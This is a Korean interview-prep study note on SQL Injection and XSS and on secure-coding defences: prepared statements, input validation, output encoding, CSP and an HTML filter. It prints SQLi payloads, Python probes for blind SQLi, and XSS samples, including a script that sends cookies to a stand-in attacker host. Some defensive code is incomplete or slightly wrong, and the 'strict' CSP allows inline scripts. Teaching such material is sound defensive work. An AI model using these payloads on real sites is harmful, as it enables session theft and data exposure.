---
question: "⭐ 웹 애플리케이션의 주요 보안 취약점인 SQL Injection과 XSS 공격의 메커니즘과 시큐어 코딩을 통한 방어 기법을 설명해주세요."
shortAnswer: "SQL Injection은 사용자 입력을 통해 악의적인 SQL 쿼리를 실행하는 공격으로 Prepared Statement로 방어하고, XSS는 악성 스크립트를 웹페이지에 삽입하는 공격으로 입력값 검증과 출력 인코딩으로 방어합니다."
---

# 웹 보안 취약점 및 방어 기법

## SQL Injection 공격

### SQL Injection 유형

#### 1. Classic SQL Injection
```sql
-- 취약한 코드 예시
SELECT * FROM users WHERE username = '$username' AND password = '$password';

-- 공격 입력
username: admin' --
password: anything

-- 실행되는 쿼리
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';
-- 패스워드 검증이 무시됨
```

#### 2. Union-based SQL Injection
```sql
-- 정상 쿼리
SELECT id, name FROM products WHERE category = 'electronics';

-- 공격 입력
category: electronics' UNION SELECT username, password FROM users --

-- 실행되는 쿼리
SELECT id, name FROM products WHERE category = 'electronics' 
UNION SELECT username, password FROM users --;
-- 사용자 정보가 노출됨
```

#### 3. Blind SQL Injection
```python
# 시간 기반 Blind SQL Injection 예시
def time_based_blind_sqli_test(url, payload):
    """시간 기반 Blind SQL Injection 테스트"""
    import requests
    import time
    
    # 정상 응답 시간 측정
    start_time = time.time()
    response = requests.get(f"{url}?id=1")
    normal_time = time.time() - start_time
    
    # 지연 페이로드 테스트
    delay_payload = f"1' AND (SELECT SLEEP(5)) --"
    start_time = time.time()
    response = requests.get(f"{url}?id={delay_payload}")
    delay_time = time.time() - start_time
    
    # 5초 이상 지연되면 취약점 존재
    if delay_time - normal_time > 4:
        return {
            'vulnerable': True,
            'type': 'Time-based Blind SQL Injection',
            'normal_time': normal_time,
            'delay_time': delay_time
        }
    
    return {'vulnerable': False}

# Boolean 기반 Blind SQL Injection
def boolean_based_blind_sqli(url):
    """Boolean 기반 Blind SQL Injection"""
    import requests
    
    # 참 조건 테스트
    true_payload = "1' AND '1'='1"
    true_response = requests.get(f"{url}?id={true_payload}")
    
    # 거짓 조건 테스트
    false_payload = "1' AND '1'='2"
    false_response = requests.get(f"{url}?id={false_payload}")
    
    # 응답 길이나 내용이 다르면 취약점 존재
    if len(true_response.text) != len(false_response.text):
        return {
            'vulnerable': True,
            'type': 'Boolean-based Blind SQL Injection'
        }
    
    return {'vulnerable': False}
```

### SQL Injection 방어 기법

#### 1. Prepared Statement (매개변수화된 쿼리)
```python
# 안전한 방식 - Prepared Statement 사용
import sqlite3

class SecureUserDAO:
    def __init__(self, db_path):
        self.connection = sqlite3.connect(db_path)
        self.cursor = self.connection.cursor()
    
    def authenticate_user(self, username, password):
        """안전한 사용자 인증"""
        # Prepared Statement 사용
        query = "SELECT id, username, role FROM users WHERE username = ? AND password = ?"
        
        try:
            self.cursor.execute(query, (username, password))
            result = self.cursor.fetchone()
            
            if result:
                return {
                    'success': True,
                    'user_id': result[0],
                    'username': result[1],
                    'role': result[2]
                }
            else:
                return {'success': False, 'message': '인증 실패'}
                
        except sqlite3.Error as e:
            return {'success': False, 'message': f'데이터베이스 오류: {e}'}
    
    def search_products(self, category, min_price, max_price):
        """안전한 상품 검색"""
        query = """
        SELECT id, name, price, description 
        FROM products 
        WHERE category = ? AND price BETWEEN ? AND ?
        ORDER BY price ASC
        """
        
        try:
            self.cursor.execute(query, (category, min_price, max_price))
            results = self.cursor.fetchall()
            
            products = []
            for row in results:
                products.append({
                    'id': row[0],
                    'name': row[1],
                    'price': row[2],
                    'description': row[3]
                })
            
            return {'success': True, 'products': products}
            
        except sqlite3.Error as e:
            return {'success': False, 'message': f'검색 오류: {e}'}

# 사용 예시
dao = SecureUserDAO('ecommerce.db')
auth_result = dao.authenticate_user('admin', 'password123')
search_result = dao.search_products('electronics', 100, 1000)
```

#### 2. 입력값 검증 및 화이트리스트
```python
# 입력값 검증 클래스
import re
from typing import Union, List

class InputValidator:
    def __init__(self):
        self.patterns = {
            'username': r'^[a-zA-Z0-9_]{3,20}$',
            'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
            'phone': r'^\d{3}-\d{4}-\d{4}$',
            'product_id': r'^\d+$',
            'category': r'^[a-zA-Z0-9_\-\s]{1,50}$'
        }
        
        self.allowed_sort_columns = ['id', 'name', 'price', 'created_at']
        self.allowed_sort_orders = ['ASC', 'DESC']
    
    def validate_input(self, input_type: str, value: str) -> dict:
        """입력값 유효성 검사"""
        if not value or not isinstance(value, str):
            return {'valid': False, 'message': '입력값이 비어있거나 잘못된 형식입니다.'}
        
        if input_type not in self.patterns:
            return {'valid': False, 'message': '지원하지 않는 입력 유형입니다.'}
        
        pattern = self.patterns[input_type]
        if re.match(pattern, value):
            return {'valid': True, 'sanitized_value': value}
        else:
            return {'valid': False, 'message': f'{input_type} 형식이 올바르지 않습니다.'}
    
    def validate_sort_params(self, sort_column: str, sort_order: str) -> dict:
        """정렬 파라미터 검증 (화이트리스트 방식)"""
        if sort_column not in self.allowed_sort_columns:
            return {'valid': False, 'message': '허용되지 않은 정렬 컬럼입니다.'}
        
        if sort_order.upper() not in self.allowed_sort_orders:
            return {'valid': False, 'message': '허용되지 않은 정렬 순서입니다.'}
        
        return {
            'valid': True,
            'sort_column': sort_column,
            'sort_order': sort_order.upper()
        }
    
    def sanitize_search_term(self, search_term: str) -> str:
        """검색어 sanitization"""
        # 특수 문자 제거
        sanitized = re.sub(r'[<>"\';\\]', '', search_term)
        
        # 길이 제한
        sanitized = sanitized[:100]
        
        # 공백 정규화
        sanitized = ' '.join(sanitized.split())
        
        return sanitized

# 사용 예시
validator = InputValidator()

# 사용자명 검증
username_result = validator.validate_input('username', 'admin123')
if username_result['valid']:
    print(f"유효한 사용자명: {username_result['sanitized_value']}")

# 정렬 파라미터 검증
sort_result = validator.validate_sort_params('price', 'ASC')
if sort_result['valid']:
    print(f"정렬: {sort_result['sort_column']} {sort_result['sort_order']}")
```

## XSS (Cross-Site Scripting) 공격

### XSS 공격 유형

#### 1. Stored XSS (저장형 XSS)
```html
<!-- 취약한 게시판 예시 -->
<div class="comment">
    <h4>사용자 댓글</h4>
    <p><?php echo $comment; ?></p>  <!-- 필터링 없이 출력 -->
</div>

<!-- 공격자가 입력한 댓글 -->
<script>
    // 쿠키 탈취
    document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<!-- 또는 -->
<img src="x" onerror="alert('XSS Attack!')">
```

#### 2. Reflected XSS (반사형 XSS)
```html
<!-- 취약한 검색 결과 페이지 -->
<h2>검색 결과: <?php echo $_GET['query']; ?></h2>

<!-- 공격 URL -->
http://vulnerable-site.com/search.php?query=<script>alert('XSS')</script>

<!-- 실행되는 HTML -->
<h2>검색 결과: <script>alert('XSS')</script></h2>
```

#### 3. DOM-based XSS
```javascript
// 취약한 JavaScript 코드
function displayWelcome() {
    var name = location.hash.substring(1);
    document.getElementById('welcome').innerHTML = 'Welcome ' + name;
}

// 공격 URL
http://vulnerable-site.com/welcome.html#<img src=x onerror=alert('XSS')>
```

### XSS 방어 기법

#### 1. 출력 인코딩 (Output Encoding)
```python
# HTML 인코딩 함수
import html
import urllib.parse
import json

class XSSProtection:
    @staticmethod
    def html_encode(text):
        """HTML 엔티티 인코딩"""
        if not text:
            return ""
        
        return html.escape(text, quote=True)
    
    @staticmethod
    def javascript_encode(text):
        """JavaScript 문자열 인코딩"""
        if not text:
            return ""
        
        # JavaScript에서 위험한 문자들을 이스케이프
        dangerous_chars = {
            '"': '\\"',
            "'": "\\'",
            '\\': '\\\\',
            '\n': '\\n',
            '\r': '\\r',
            '\t': '\\t',
            '<': '\\u003c',
            '>': '\\u003e',
            '&': '\\u0026'
        }
        
        encoded = text
        for char, escape in dangerous_chars.items():
            encoded = encoded.replace(char, escape)
        
        return encoded
    
    @staticmethod
    def url_encode(text):
        """URL 인코딩"""
        if not text:
            return ""
        
        return urllib.parse.quote(text, safe='')
    
    @staticmethod
    def json_encode(data):
        """JSON 안전 인코딩"""
        return json.dumps(data, ensure_ascii=True)

# 사용 예시
xss_protection = XSSProtection()

# HTML 컨텍스트에서 사용
user_input = "<script>alert('XSS')</script>"
safe_html = xss_protection.html_encode(user_input)
print(f"안전한 HTML: {safe_html}")
# 출력: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

# JavaScript 컨텍스트에서 사용
js_data = "'; alert('XSS'); //"
safe_js = xss_protection.javascript_encode(js_data)
print(f"안전한 JS: {safe_js}")
# 출력: \\'; alert(\\'XSS\\'); //
```

#### 2. Content Security Policy (CSP)
```python
# CSP 헤더 설정
class CSPManager:
    def __init__(self):
        self.csp_policies = {
            'strict': {
                'default-src': "'self'",
                'script-src': "'self' 'unsafe-inline'",
                'style-src': "'self' 'unsafe-inline'",
                'img-src': "'self' data: https:",
                'font-src': "'self' https://fonts.googleapis.com",
                'connect-src': "'self'",
                'frame-ancestors': "'none'",
                'base-uri': "'self'",
                'form-action': "'self'"
            },
            'moderate': {
                'default-src': "'self'",
                'script-src': "'self' https://trusted-cdn.com",
                'style-src': "'self' 'unsafe-inline' https://fonts.googleapis.com",
                'img-src': "'self' data: https:",
                'font-src': "'self' https://fonts.googleapis.com",
                'connect-src': "'self' https://api.trusted-service.com"
            }
        }
    
    def generate_csp_header(self, policy_level='strict'):
        """CSP 헤더 생성"""
        if policy_level not in self.csp_policies:
            policy_level = 'strict'
        
        policy = self.csp_policies[policy_level]
        csp_directives = []
        
        for directive, value in policy.items():
            csp_directives.append(f"{directive} {value}")
        
        return "; ".join(csp_directives)
    
    def get_security_headers(self):
        """보안 헤더 전체 세트"""
        return {
            'Content-Security-Policy': self.generate_csp_header('strict'),
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
        }

# Flask 애플리케이션에서 사용 예시
from flask import Flask, render_template_string

app = Flask(__name__)
csp_manager = CSPManager()

@app.after_request
def add_security_headers(response):
    """모든 응답에 보안 헤더 추가"""
    security_headers = csp_manager.get_security_headers()
    
    for header, value in security_headers.items():
        response.headers[header] = value
    
    return response

@app.route('/safe-page')
def safe_page():
    user_input = request.args.get('message', '')
    
    # XSS 방지를 위한 인코딩
    safe_message = XSSProtection.html_encode(user_input)
    
    template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>안전한 페이지</title>
    </head>
    <body>
        <h1>사용자 메시지</h1>
        <p>{{ message }}</p>
    </body>
    </html>
    '''
    
    return render_template_string(template, message=safe_message)
```

#### 3. 입력값 검증 및 필터링
```python
# XSS 필터링 클래스
import re
from html.parser import HTMLParser

class XSSFilter:
    def __init__(self):
        self.allowed_tags = ['b', 'i', 'u', 'strong', 'em', 'p', 'br']
        self.allowed_attributes = {
            'a': ['href', 'title'],
            'img': ['src', 'alt', 'width', 'height']
        }
        
        # 위험한 패턴들
        self.dangerous_patterns = [
            r'<script.*?>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'<iframe.*?>',
            r'<object.*?>',
            r'<embed.*?>',
            r'<link.*?>',
            r'<meta.*?>',
            r'<style.*?>.*?</style>'
        ]
    
    def remove_dangerous_patterns(self, text):
        """위험한 패턴 제거"""
        cleaned_text = text
        
        for pattern in self.dangerous_patterns:
            cleaned_text = re.sub(pattern, '', cleaned_text, flags=re.IGNORECASE | re.DOTALL)
        
        return cleaned_text
    
    def sanitize_html(self, html_content):
        """HTML 콘텐츠 sanitization"""
        # 1단계: 위험한 패턴 제거
        sanitized = self.remove_dangerous_patterns(html_content)
        
        # 2단계: 허용된 태그만 유지
        sanitized = self.filter_allowed_tags(sanitized)
        
        # 3단계: 속성 필터링
        sanitized = self.filter_attributes(sanitized)
        
        return sanitized
    
    def filter_allowed_tags(self, html_content):
        """허용된 태그만 유지"""
        # 간단한 태그 필터링 (실제로는 더 정교한 HTML 파서 사용 권장)
        allowed_pattern = '|'.join(self.allowed_tags)
        
        # 허용되지 않은 태그 제거
        pattern = r'<(?!/?(?:' + allowed_pattern + r')\b)[^>]*>'
        filtered = re.sub(pattern, '', html_content, flags=re.IGNORECASE)
        
        return filtered
    
    def validate_url(self, url):
        """URL 유효성 검사"""
        if not url:
            return False
        
        # 허용된 프로토콜만 허용
        allowed_protocols = ['http://', 'https://', 'mailto:']
        
        url_lower = url.lower().strip()
        
        # javascript: 프로토콜 차단
        if url_lower.startswith('javascript:'):
            return False
        
        # data: URL 차단 (이미지 제외)
        if url_lower.startswith('data:') and not url_lower.startswith('data:image/'):
            return False
        
        # 허용된 프로토콜 확인
        if any(url_lower.startswith(protocol) for protocol in allowed_protocols):
            return True
        
        # 상대 URL 허용
        if not url_lower.startswith(('http://', 'https://', '//', 'javascript:', 'data:')):
            return True
        
        return False

# 사용 예시
xss_filter = XSSFilter()

# 위험한 입력
malicious_input = '''
<p>안전한 텍스트</p>
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<a href="javascript:alert('XSS')">링크</a>
'''

# 필터링 적용
safe_output = xss_filter.sanitize_html(malicious_input)
print("필터링된 출력:", safe_output)
# 출력: <p>안전한 텍스트</p> <a href="#">링크</a>
```

## 실무 면접 예상 질문

### SQL Injection 관련
1. **"SQL Injection을 방어하는 가장 효과적인 방법은?"**
   - Prepared Statement (매개변수화된 쿼리)
   - 입력값 검증 및 화이트리스트
   - 최소 권한 DB 계정 사용

2. **"Blind SQL Injection과 일반 SQL Injection의 차이점은?"**
   - 일반: 에러 메시지나 결과가 직접 노출
   - Blind: 참/거짓 또는 시간 지연으로 정보 추출

### XSS 관련
1. **"Stored XSS와 Reflected XSS의 차이점과 위험도는?"**
   - Stored: 서버에 저장되어 지속적 공격 (높은 위험도)
   - Reflected: 일회성 공격 (상대적으로 낮은 위험도)

2. **"CSP 헤더가 XSS 방어에 어떻게 도움이 되나요?"**
   - 스크립트 실행 소스 제한
   - 인라인 스크립트 차단
   - 외부 리소스 로딩 제어

### KISA 교육 경험 어필 포인트
- **실습 경험**: 실제 취약점 분석 및 공격 시뮬레이션
- **방어 기법**: 시큐어 코딩 및 입력값 검증 구현
- **도구 활용**: 보안 테스트 도구 사용 경험
- **보안 의식**: 개발 단계에서부터 보안 고려
- **윤리적 해킹**: 정보보호 전문가로서의 윤리 의식

### 실무 시나리오 질문
1. **"기존 웹 애플리케이션에서 SQL Injection 취약점을 발견했을 때 어떻게 대응하시겠습니까?"**
2. **"개발팀에서 XSS 방어를 위해 어떤 가이드라인을 제시하시겠습니까?"**
3. **"웹 애플리케이션 보안 점검 시 어떤 항목들을 우선적으로 확인하시겠습니까?"**
